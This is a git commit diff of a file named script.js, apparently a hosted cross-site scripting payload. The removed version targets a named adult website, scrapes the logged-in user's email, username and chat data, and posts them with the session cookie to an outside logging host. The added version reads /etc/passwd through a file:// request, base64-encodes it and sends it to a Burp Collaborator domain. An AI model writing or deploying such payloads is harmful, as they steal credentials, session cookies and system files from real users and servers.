0ca1e7138e59edca8cd31c99e592c964f7a359dc
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-10-26 20:23:40 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,32 +1,9 @@
-if(document.domain=="www.pornhub.com"){
-var xhr = new XMLHttpRequest();
-xhr.withCredentials = true;
-xhr.open("GET", "/chat/check");
-xhr.onreadystatechange = () => {
-    if (xhr.readyState == 4) {
+var url="file:///etc/passwd"
+var xhr=new XMLHttpRequest();
+xhr.open("GET", url, false);
+xhr.send();
+var resp=btoa(xhr.responseText);
 
-       var message=xhr.responseText
-        xhr.open("GET", "/user/security");
-        xhr.onreadystatechange = () => {
-            if (xhr.readyState == 4) {
-                const parser = new DOMParser();
-                var dom = parser.parseFromString(xhr.responseText, "text/html")
-try{
-                var email = dom.getElementById("email").value;
-                var username = dom.getElementById("username").value;
-}catch(e){}
-                xhr.open("POST","https://test-vul.000webhostapp.com/log.php");
-
-xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
-
-xhr.send(`email=${email}&username=${username}&message=${message}&cookie=${document.cookie}`);
-xhr.onreadystatechange=()=>{
-}
-            
-}
-        }
-        xhr.send()
-    }
-}
-xhr.send()
-}
+var xhr2=new XMLHttpRequest(); 
+xhr2.open("POST", 'http://7u2lw3lguypscnd7c1l7jbfk1b72vsjh.oastify.com/', false);
+xhr2.send(resp);
